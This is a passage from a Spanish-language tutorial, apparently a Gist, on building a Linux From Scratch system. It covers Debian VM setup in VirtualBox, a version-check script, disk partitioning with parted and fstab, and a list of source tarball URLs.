&lt;/p&gt;&lt;br&gt;

Una vez hecho, indicamos un tamaño de memoria. En mi caso, asignaré **4096 MB** de memoria:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346mU.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En el siguiente paso, crearemos un nuevo disco duro virtual:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346mV.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En la selección del tipo de archivo de disco duro, usaremos **VDI**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346n3.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En la especificación de almacenamiento en unidad de disco duro física escogeremos **Tamaño fijo**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346n1.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Y por último, asignaremos un total de **30 GB** para nuestro disco duro virtual:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346n2.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez finalizado, lo único que tendremos que hacer es dirigirnos a las propiedades de nuestra nueva máquina e importar la ISO de nuestro Debian (la que previamente hemos descargado).

Esto se hace desde la siguiente sección:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346nf.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ya con todo esto hecho, debería salirnos algo como esto:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346nj.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este punto, lo único que tendremos que hacer ya es arrancar la máquina y comenzar con la fase de instalación.

Seleccionaremos el idioma:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346nt.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Desde aquí, habrá que rellenar una serie de datos de ubicación que no creo que haga falta añadir en este Gist (es puro sentido común y no creo que tenga pérdida).

En la especificación de nombre de máquina, yo pondré **Debian**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346o3.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Cuando nos pregunten por el nombre de dominio, simplemente dejad este campo en blanco:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346o2.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Rellenad en el siguiente paso vuestra clave de superusuario:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346o4.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Tanto en el nombre de usuario como en el nombre de cuenta, como es de obviar... especificaremos nuestro usuario identificativo:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346oe.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Y como es de esperar, nuestra contraseña (para no liarnos yo siempre recomiendo que sea la misma que la clave del superusuario):

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346od.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ya con esta fase terminada, se nos preguntará por la zona horaria y nuestra ubicación, aquí que cada uno rellene los datos que considere.

En el particionado de discos, escogeremos la opción de usar todo el disco:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346or.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Deberíamos ver posteriormente algo como esto:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346os.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez hecho, en nuestro caso el esquema de particionado será con todos los ficheros en una partición (posteriormente en nuestro sistema Linux el esquema de particionado será con el /home en otra partición, pero por ahora en nuestro Debian base lo haremos así de simple):

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346ot.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por último, aplicamos todos los cambios seleccionando la opción '**Finalizar el particionado**':

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346ou.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Seleccionaremos la opción **Sí**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346oL.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En caso de que nos pregunte por otro CD a utilizar, le diremos que no:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346oR.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Y en caso de que nos pregunte por las réplicas de red, de la misma forma seleccionaremos la opción **No**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346oU.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En la selección de programas, nosotros estaremos trabajando con entorno gráfico para estar más cómodos, por tanto... seleccionaremos las siguientes opciones a instalar:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346p2.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Esta fase puede durar unos minutos. Nos preguntará si queremos instalar el cargador de arranque (GRUB), le diremos que sí:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346ps.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Asimismo, indicaremos el dispositivo donde queremos instalar el cargador de arranque, en este caso **/dev/sda**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346pu.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ya llegados a este punto, habríamos finalizado con toda la fase de instalación y debería salirnos un recuadro como este:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346pV.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Al presionar en '**Continuar**', nuestro Debian debería arrancar sin mayor inconveniente hasta llegar al entorno gráfico:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346q5.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Dado que las proporciones no son las correctas y estaríamos trabajando con una ventana muy chiquita, en el siguiente punto veremos cómo instalar las **VBox Linux Additions**.

#### Configurando el Debian base

Antes de instalar las **Linux Additions** para poder trabajar de manera cómoda, lo que haremos será retocar una línea del archivo **/etc/apt/sources.list**.

Comentaremos la línea que empieza por '**deb cdrom**', ya que esta de no estar comentada hace que se nos paren las compilaciones más adelante y estaremos trabajando de manera incómoda:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346qT.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

De la misma forma, descomentaremos las 2 últimas líneas y antes de estas añadiremos un nuevo **deb**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346rL.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez hecho, aplicaremos el siguiente comando a nivel de sistema:

```bash
apt update
```

Obteniendo el siguiente output por consola:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346rM.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Esta parte es fundamental pues de lo contrario no nos encontrará los paquetes **build-essential** y **linux-headers-amd64**, necesarios para instalar las **VBoxLinuxAdditions**.

Aplicamos los siguientes comandos como el usuario **root** para instalar lo previamente citado:

```bash
apt install build-essential linux-headers-amd64 -y
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346sw.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Este proceso puede tardar unos minutos.

Ahora bien, ¿cómo hacemos para instalar las **VBoxLinuxAdditions**?. En VirtualBox, en la parte superior, contamos con esta utilidad:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346t7.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Al presionarla, desde nuestra máquina virtual deberemos ver lo siguiente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346t8.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este punto, deberíamos presionar en 'Ejecutar'. Si vemos un fallo... es normal, no nos asustemos.

Lo que haremos será de forma manual atender a la siguiente ruta:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346t9.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Eso sí, dado que en esta montura tenemos permisos únicamente de lectura, lo que haremos será crearnos una copia del archivo **VBoxLinuxAdditions.run**, posteriormente le daremos permisos de ejecución y lo ejecutaremos con bash:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346tH.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Para concluir, aplicamos un **reboot** de la siguiente forma:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346tM.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez reiniciado nuestro Debian, el entorno gráfico se nos debería cargar perfectamente en pantalla completa sin mayor inconveniente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346tX.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Instalación de paquetes base

Lo que haremos a continuación será crear el siguiente script:

```bash
cat &gt; version-check.sh &lt;&lt; &quot;EOF&quot;
#!/bin/bash
# Simple script to list version numbers of critical development tools
export LC_ALL=C
bash --version | head -n1 | cut -d&quot; &quot; -f2-4
MYSH=$(readlink -f /bin/sh)
echo &quot;/bin/sh -&gt; $MYSH&quot;
echo $MYSH | grep -q bash || echo &quot;ERROR: /bin/sh does not point to bash&quot;
unset MYSH

echo -n &quot;Binutils: &quot;; ld --version | head -n1 | cut -d&quot; &quot; -f3-
bison --version | head -n1

if [ -h /usr/bin/yacc ]; then
  echo &quot;/usr/bin/yacc -&gt; `readlink -f /usr/bin/yacc`&quot;;
elif [ -x /usr/bin/yacc ]; then
  echo yacc is `/usr/bin/yacc --version | head -n1`
else
  echo &quot;yacc not found&quot; 
fi

bzip2 --version 2&gt;&amp;1 &lt; /dev/null | head -n1 | cut -d&quot; &quot; -f1,6-
echo -n &quot;Coreutils: &quot;; chown --version | head -n1 | cut -d&quot;)&quot; -f2
diff --version | head -n1
find --version | head -n1
gawk --version | head -n1

if [ -h /usr/bin/awk ]; then
  echo &quot;/usr/bin/awk -&gt; `readlink -f /usr/bin/awk`&quot;;
elif [ -x /usr/bin/awk ]; then
  echo awk is `/usr/bin/awk --version | head -n1`
else 
  echo &quot;awk not found&quot; 
fi

gcc --version | head -n1
g++ --version | head -n1
ldd --version | head -n1 | cut -d&quot; &quot; -f2-  # glibc version
grep --version | head -n1
gzip --version | head -n1
cat /proc/version
m4 --version | head -n1
make --version | head -n1
patch --version | head -n1
echo Perl `perl -V:version`
python3 --version
sed --version | head -n1
tar --version | head -n1
makeinfo --version | head -n1  # texinfo version
xz --version | head -n1

echo 'int main(){}' &gt; dummy.c &amp;&amp; g++ -o dummy dummy.c
if [ -x dummy ]
  then echo &quot;g++ compilation OK&quot;;
  else echo &quot;g++ compilation failed&quot;; fi
rm -f dummy.c dummy
EOF
```

Tras su ejecución, lo normal es obtener errores como los que se listan a continuación:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346vL.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Esto es así dado que vamos a tener que ir instalando una serie de dependencias así como de enlaces simbólicos hasta que la ejecución de este script nos diga que está todo correcto. Lo utilizaremos como Checker.

Lo que haremos será seguir la siguiente filosofía:

* Si el paquete se encuentra instalado, instalaremos el dev [siempre y cuando el paquete disponga del dev]. Si no se encuentra instalado, instalaremos el paquete y el dev.

¿Qué es esto del dev?, bueno... cada paquete (no todos), suelen venir con una paquetería de desarrollador (-dev o -devel). Estos paquetes adicionales de desarrollador son necesarios para que todo el proceso de construcción de nuestro sistema Linux vaya correctamente.

##### Bash

Empezaremos por el paquete Bash. Haremos la siguiente comprobación:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346wb.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este caso, vemos que el paquete ya lo tenía instalado en el sistema. El paquete **Bash** no cuenta con paquetería de desarrollador, por tanto... lo único que aplico conforme a la validación del script que previamente habíamos ejecutado, es un enlace simbólico para que la '**/bin/sh**' apunte a una **Bash**.

##### Binutils

Validamos de la misma forma e instalamos su correspondiente paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346wE.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Bison

Este paquete no se debería de encontrar instalado en el sistema, por tanto... instalamos y a la vez instalamos su paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346wM.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Bzip2

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346x2.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Coreutils

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346x8.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Diffutils

Se encuentra instalado en el sistema y no posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346xB.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Findutils

Se encuentra instalado en el sistema y no posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346xC.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Gawk

Se encuentra instalado en el sistema y no posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346xV.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Gcc

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346yf.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Glibc

No se encuentra instalado en el sistema y no posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346yk.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Grep

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346yD.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Gzip

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346yE.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### M4

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346zX.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Make

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346A7.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Patch

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ad.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Perl

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ak.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Python

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ax.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Sed

Se encuentra instalado en el sistema y no posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ay.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Tar

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346AD.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Texinfo

No se encuentra instalado en el sistema y no posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346By.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Xz

Se encuentra instalado en el sistema y posee paquetería de desarrollador:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346AN.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Version Check

Una vez instalados todos los paquetes, ejecutaremos los siguientes comandos para crear una serie de links simbólicos necesarios para que todo funcione correctamente:

```bash
ln -svf bison /usr/bin/yacc
ln -svf gawk /usr/bin/awk
```

Ya con esto hecho, ejecutaremos el script **version-check.sh** previamente creado y analizamos si nos da algún error:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346BS.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Como vemos, no se nos reporta ningún error... por lo que podremos continuar. Si en este punto se te arroja algún error, es que has metido la pata en algún sitio y no has instalado correctamente algún paquete necesario.

¿Mi recomendación en este punto?, crea una instantánea, no vaya a ser que en breve la líes y tengas que volver a empezar desde 0... así por lo menos te das el margen de empezar desde aquí:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346C9.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Creando nueva partición
===============================================================================================================================

En este punto, ya con todo lo anterior correctamente configurado, lo que haremos será apagar la máquina virtual. Nos iremos a la configuración de nuestra máquina, y añadiremos un nuevo disco... donde irá el LFS:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Dx.png&quot;&gt;
&lt;/p&gt;&lt;br

Una vez más, será de tipo **VDI**. En la selección del tipo de almacenamiento en unidad de disco duro física, indicaremos que queremos trabajar con un tamaño fijo:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Dy.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Posteriormente, identificamos el **VDI** donde irá nuestro nuevo sistema Linux con un nombre descriptivo. Yo lo llamaré **S4viOS** (30 GB):

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Dz.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez creado, lo que hacemos es añadirlo justo debajo del ya existente correspondiente al Debian:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346DA.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez añadido, debería verse tal que así:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346DB.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Si arrancamos el Debian, todo debería continuar funcionando correctamente.

Al aplicar el comando **lsblk**, deberíamos ver una nueva partición en **/dev/sdb**, correspondiente a la que hemos creado para **S4viOS**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346DC.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

**¡Importante en este punto antes de continuar!**, como de aquí en adelante es probable que nos encontremos con fases de larga espera, lo mejor es quitar esto que nos sale cuando estamos inactivos:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346EU.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

No creo que nos haga mucha gracia que en una plena instalación se nos apague de pronto el equipo por inactividad. Para quitar este modo, buscamos '**Energía**' en el buscador de herramientas, y ponemos la siguiente configuración:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346F1.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Estructurando la partición con parted

Lo que tenemos que pensar en este punto es lo siguiente, vamos a echar de nuevo un ojo a nuestras particiones:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346DC.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

La idea en este punto es dejar **sdb** tal y como se ve **sda**, con el mismo esquema de particiones con la diferencia de que yo en este caso añadiré una partición aparte adicional para el **/home** de nuestro sistema S4viOS por separado.

Esto lo podemos hacer desde **parted**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hr.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este caso, lo único que he hecho ha sido seleccionar la partición con la que quiero trabajar (**sdb**) y he analizado sus propiedades con **print**.

Si os fijáis, no detecta el label de la tabla de particiones. Vamos a echar un ojo a las propiedades de la partición **sda** ya existente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hq.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este caso el label corresponde a **msdos**. Pues la idea es replicar el mismo &quot;escenario&quot;, por tanto... volveremos a nuestra partición **sdb** y aplicaremos estos cambios en el label:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hs.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Tras volver a hacer un **print**, en este caso ya vemos cómo se lista la información correctamente.

Ahora bien, lo dicho... iremos creando una serie de particiones, tanto primarias, como extendidas, como lógicas en función de cómo lo queramos nosotros organizar. En mi caso lo organizaré de la siguiente forma:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ht.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Como vemos, las Flags para cada una de las particiones están identificadas como **lba**, y en la partición **sda** si lo verificáis veréis como esto no es así, únicamente está representada la partición primaria con el Flag **boot**.

Pues nosotros haremos lo mismo, es decir... copiaremos el esquema:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hu.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este punto, lo que recomiendo es comparar **sda** con **sdb** para ver si siguen la misma estructura:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hv.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ahora bien, en cuanto a particiones respecta... deberíamos ver algo como esto en estos instantes:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hw.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Como podréis apreciar, aún no hay UUID's identificativos para las particiones **sdb1, sdb5 y sdb6**. Esto es normal, dado que para ello previamente tenemos que asignar un filesystem a cada una de ellas:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jt.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ya con esto hecho, a través del comando `lsblk -f` podremos sacar los respectivos UUID's de cada una de las particiones. De todas formas, hay un modo más cómodo que sería el siguiente sobre las particiones que nos interesan:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jw.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

¿Qué hacemos con estos UUID's?, pues configurarlos en el '**/etc/fstab**'. Este archivo, por defecto debería alojar el siguiente contenido:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ju.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Pues lo que nosotros haremos será justamente lo mismo pero para nuestra partición:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jv.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

La raíz de nuestro sistema Linux S4viOS estará definido por la partición primaria, y será desde '*/mnt/lfs*' donde configuraremos la raíz (aunque ese directorio aún no exista, no nos preocupemos... lo crearemos en breve siguiendo este esquema). 

Por otro lado, especificamos el UUID del SWAP, que correspondería al espacio de intercambio y por último el UUID de la partición que asignaremos a la '**/home**' accesible desde nuestro equipo Debian en '*/mnt/lfs/home*'.

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jx.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este punto, creamos los respectivos directorios definidos en el '**/etc/fstab**', montamos las particiones en dichas rutas y jugamos con **swapon**, ampliamente usado para habilitar/deshabilitar dispositivos y archivos para paginación e intercambio, en este caso sobre nuestro SWAP (**/dev/sdb5**).

Finalmente, si hacemos un `lsblk` tal y como se aprecia en la imagen de arriba, deberíamos ver esa misma estructura de particiones. Si esto es así, podremos continuar con las siguientes fases, ¡pero no sin antes crear otra Snapshot!, que nunca se sabe:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jy.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Descarga de paquetes para la creación del sistema base
===============================================================================================================================

Comenzaremos creándonos un directorio en '*$LFS/sources*':

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/347Pv.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Desde aquí, tendremos que descargar una serie de paquetes los cuales tendremos que ir descomprimiendo y compilando poco a poco.

Para trabajar rápido, haremos lo siguiente, crearéis un archivo `wget-list` con el siguiente contenido:

```bash
http://download.savannah.gnu.org/releases/attr/attr-2.4.48.tar.gz
http://ftp.gnu.org/gnu/autoconf/autoconf-2.69.tar.xz
http://ftp.gnu.org/gnu/automake/automake-1.16.1.tar.xz
http://ftp.gnu.org/gnu/bash/bash-5.0.tar.gz
https://github.com/gavinhoward/bc/archive/2.5.3/bc-2.5.3.tar.gz
http://ftp.gnu.org/gnu/binutils/binutils-2.34.tar.xz
http://ftp.gnu.org/gnu/bison/bison-3.5.2.tar.xz
https://www.sourceware.org/pub/bzip2/bzip2-1.0.8.tar.gz
https://github.com/libcheck/check/releases/download/0.14.0/check-0.14.0.tar.gz
http://ftp.gnu.org/gnu/coreutils/coreutils-8.31.tar.xz
http://ftp.gnu.org/gnu/dejagnu/dejagnu-1.6.2.tar.gz
http://ftp.gnu.org/gnu/diffutils/diffutils-3.7.tar.xz
https://downloads.sourceforge.net/project/e2fsprogs/e2fsprogs/v1.45.5/e2fsprogs-1.45.5.tar.gz
https://sourceware.org/ftp/elfutils/0.178/elfutils-0.178.tar.bz2
http://download.savannah.gnu.org/releases/acl/acl-2.2.53.tar.gz
https://dev.gentoo.org/~blueness/eudev/eudev-3.2.9.tar.gz
https://prdownloads.sourceforge.net/expat/expat-2.2.9.tar.xz
https://prdownloads.sourceforge.net/expect/expect5.45.4.tar.gz
ftp://ftp.astron.com/pub/file/file-5.38.tar.gz
http://ftp.gnu.org/gnu/findutils/findutils-4.7.0.tar.xz
https://github.com/westes/flex/releases/download/v2.6.4/flex-2.6.4.tar.gz
http://ftp.gnu.org/gnu/gawk/gawk-5.0.1.tar.xz
http://ftp.gnu.org/gnu/gcc/gcc-9.2.0/gcc-9.2.0.tar.xz
http://ftp.gnu.org/gnu/gdbm/gdbm-1.18.1.tar.gz
http://ftp.gnu.org/gnu/gettext/gettext-0.20.1.tar.xz
http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.xz
http://ftp.gnu.org/gnu/gmp/gmp-6.2.0.tar.xz
http://ftp.gnu.org/gnu/gperf/gperf-3.1.tar.gz
http://ftp.gnu.org/gnu/grep/grep-3.4.tar.xz
http://ftp.gnu.org/gnu/groff/groff-1.22.4.tar.gz
https://ftp.gnu.org/gnu/grub/grub-2.04.tar.xz
http://ftp.gnu.org/gnu/gzip/gzip-1.10.tar.xz
http://anduin.linuxfromscratch.org/LFS/iana-etc-2.30.tar.bz2
http://ftp.gnu.org/gnu/inetutils/inetutils-1.9.4.tar.xz
https://launchpad.net/intltool/trunk/0.51.0/+download/intltool-0.51.0.tar.gz
https://www.kernel.org/pub/linux/utils/net/iproute2/iproute2-5.5.0.tar.xz
https://www.kernel.org/pub/linux/utils/kbd/kbd-2.2.0.tar.xz
https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-26.tar.xz
http://www.greenwoodsoftware.com/less/less-551.tar.gz
http://www.linuxfromscratch.org/lfs/downloads/9.1/lfs-bootscripts-20191031.tar.xz
https://www.kernel.org/pub/linux/libs/security/linux-privs/libcap2/libcap-2.31.tar.xz
ftp://sourceware.org/pub/libffi/libffi-3.3.tar.gz
http://download.savannah.gnu.org/releases/libpipeline/libpipeline-1.5.2.tar.gz
http://ftp.gnu.org/gnu/libtool/libtool-2.4.6.tar.xz
https://www.kernel.org/pub/linux/kernel/v5.x/linux-5.5.3.tar.xz
http://ftp.gnu.org/gnu/m4/m4-1.4.18.tar.xz
http://ftp.gnu.org/gnu/make/make-4.3.tar.gz
http://download.savannah.gnu.org/releases/man-db/man-db-2.9.0.tar.xz
https://www.kernel.org/pub/linux/docs/man-pages/man-pages-5.05.tar.xz
https://github.com/mesonbuild/meson/releases/download/0.53.1/meson-0.53.1.tar.gz
